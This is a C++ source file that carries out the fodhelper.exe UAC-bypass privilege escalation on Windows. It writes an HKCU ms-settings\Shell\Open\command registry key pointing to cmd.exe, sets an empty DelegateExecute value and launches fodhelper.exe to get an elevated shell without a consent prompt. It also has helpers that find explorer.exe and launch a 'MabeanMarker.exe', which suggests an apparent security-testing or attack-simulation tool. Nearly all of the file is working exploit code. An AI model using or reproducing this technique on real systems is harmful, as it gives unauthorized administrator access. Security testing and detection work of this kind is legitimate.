#include "pch.h"
#include "FodHelperAbuseEscalationUtils.h"

#include <shellapi.h>
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <wchar.h>

#pragma comment(lib, "Advapi32.lib")

DWORD FindExplorerPidInMySession()
{
    DWORD mySession = 0;
    if (!ProcessIdToSessionId(GetCurrentProcessId(), &mySession))
        return 0;

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe{};
    pe.dwSize = sizeof(pe);

    DWORD pid = 0;
    for (BOOL ok = Process32FirstW(snap, &pe); ok; ok = Process32NextW(snap, &pe))
    {
        if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0)
        {
            DWORD s = 0;
            if (ProcessIdToSessionId(pe.th32ProcessID, &s) && s == mySession)
            {
                pid = pe.th32ProcessID;
                break;
            }
        }
    }

    CloseHandle(snap);
    return pid;
}
void Marker() {
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    si.cb = sizeof(si);

    wchar_t appPath[MAX_PATH] = { 0 };

    if (!ExpandEnvironmentStringsW(L"%LOCALAPPDATA%\\Mabean\\data\\MabeanMarker.exe", appPath, MAX_PATH)) {
        printf("ExpandEnvironmentStrings failed: %lu\n", GetLastError());
    }

    if (!CreateProcessW(
        appPath,
        NULL,
        NULL,
        NULL,
        FALSE,
        2,
        NULL,
        NULL,
        &si,
        &pi))
    {
        printf("CreateProcess failed: %lu\n", GetLastError());
    }

    printf("Process started with PID: %lu\n", pi.dwProcessId);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}
int FodHelperAbuseEscalationInternal() {
    HKEY hkey;
    DWORD d;
    const char* settings = "Software\\Classes\\ms-settings\\Shell\\Open\\command";
    const char* cmd = "cmd /c start C:\\Windows\\System32\\cmd.exe";
    const char* del = "";

    LSTATUS stat = RegCreateKeyExA(HKEY_CURRENT_USER, settings, 0, NULL, 0, KEY_WRITE, NULL, &hkey, &d);
    printf(stat != ERROR_SUCCESS ? "FAILED TO OPEN OR CREATE REG KEY\n" : "succesfully created reg key\n");

    stat = RegSetValueExA(hkey, NULL, 0, REG_SZ, (const BYTE*)cmd, (DWORD)strlen(cmd) + 1);
    printf(stat != ERROR_SUCCESS ? "FAILED TO SET REG VALUE\n" : "succesfully set reg value\n");

    stat = RegSetValueExA(hkey, "DelegateExecute", 0, REG_SZ, (const BYTE*)del, (DWORD)strlen(del) + 1);
    printf(stat != ERROR_SUCCESS ? "FAILED TO SET REG VALUE\n" : "succesfully set reg value\n");

    RegCloseKey(hkey);

    SHELLEXECUTEINFO shellExecuteInfo = { sizeof(shellExecuteInfo) };
    shellExecuteInfo.cbSize = sizeof(shellExecuteInfo);
    shellExecuteInfo.lpVerb = L"runas";
    shellExecuteInfo.lpFile = L"C:\\Windows\\System32\\fodhelper.exe";
    shellExecuteInfo.hwnd = NULL;
    shellExecuteInfo.nShow = SW_NORMAL;

    if (!ShellExecuteEx(&shellExecuteInfo)) {
        DWORD error = GetLastError();
        printf(error == ERROR_CANCELLED ? "The user refused to allow privilege elevation.\n" : "Unexpected error! Error code: %ld\n", error);
    }
    else {
        printf("Successfully created the process =^..^=\n");
    }

    return 0;
}